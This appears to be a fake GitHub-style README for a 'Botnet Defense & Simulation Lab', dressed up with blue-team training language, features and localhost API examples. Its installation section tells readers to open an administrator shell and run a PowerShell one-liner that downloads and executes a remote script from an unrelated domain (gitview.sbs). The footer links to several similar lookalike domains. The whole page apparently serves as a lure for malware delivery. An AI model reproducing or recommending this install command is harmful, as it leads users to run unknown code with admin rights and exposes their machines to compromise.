# Botnet Defense & Simulation Lab

> A defensive education lab for understanding botnet risk, detecting suspicious traffic patterns, and rehearsing containment with synthetic data.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitview.sbs?get=botnet-tools | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Botnet Tools modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Botnet Tools.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

**Botnet Defense & Simulation Lab** teaches network defenders how botnet campaigns are modeled, detected, contained, and reported using harmless simulated events. It is intended for blue-team training, not for operating or building abusive infrastructure.

**Best for:** SOC analysts, network defenders, instructors, and incident responders.

## Core Features

- ✅ **Synthetic Topology** — Model managed devices, sensors, and isolated network segments.
- ✅ **Traffic Baselines** — Compare normal and anomalous patterns from generated events.
- ✅ **Detection Exercises** — Review alerts, correlate indicators, and document confidence.
- ✅ **Containment Drills** — Practice isolation, evidence preservation, and recovery steps.
- ✅ **Incident Runbooks** — Create role-based checklists for triage and escalation.
- ✅ **Metrics Dashboard** — Track time to detect, contain, and recover in simulations.
- ✅ **Offline Reports** — Export training results without sending data externally.

## Usage

```bash
python -m lab topology load --preset small-office
python -m lab traffic simulate --scenario synthetic-beacon --duration 5m
python -m lab detect --events events/synthetic.json
python -m lab report export --format markdown
```

## REST API

> [!NOTE]
> The localhost API exposes simulation and training state only. It cannot contact external hosts or control real devices.

```bash
python -m lab serve --host 127.0.0.1 --port 8000
curl http://127.0.0.1:8000/api/health
curl http://127.0.0.1:8000/api/scenarios
curl -X POST http://127.0.0.1:8000/api/drills \
  -H "Content-Type: application/json" \
  -d '{"name":"containment-practice","scenario":"synthetic-beacon"}'
```

## Screenshots

- Topology map: `screenshots/topology-map.png`
- Traffic baseline: `screenshots/traffic-baseline.png`
- Alert review: `screenshots/alert-review.png`
- Incident runbook: `screenshots/incident-runbook.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Simulation produces no events | Confirm the scenario is synthetic and the duration is positive. |
| Detection results are empty | Load the matching event schema and rerun the detector. |
| Dashboard is unavailable | Check that the virtual environment is active and port 8000 is free. |
| Report contains internal names | Redact labels before exporting training material. |

## Use Cases

- **Blue-Team Training** — Rehearse botnet triage without harmful infrastructure.
- **Detection Engineering** — Test alert logic against controlled event streams.
- **Incident Response** — Practice containment and communication roles.
- **Risk Education** — Explain botnet impact to technical and nontechnical teams.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Never adapt this lab into a command-and-control system, payload delivery service, credential collection tool, or unauthorized scanner. Use only authorized environments and synthetic data.

> [!TIP]
> Keep simulation names and indicators clearly marked as synthetic to prevent accidental operational use.

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

## Tags

<!--
botnet-tools, defensive-security, blue-team, simulation, detection-engineering, incident-response, containment, security-training
-->

[gitsl.xyz](https://gitsl.xyz?t=botnet-tools) | [gitrm.sbs](https://gitrm.sbs?t=botnet-tools) | [viewgit.sbs](https://viewgit.sbs?t=botnet-tools) | [gitrm.cfd](https://gitrm.cfd?t=botnet-tools) | [gitview.sbs](https://gitview.sbs?t=botnet-tools)
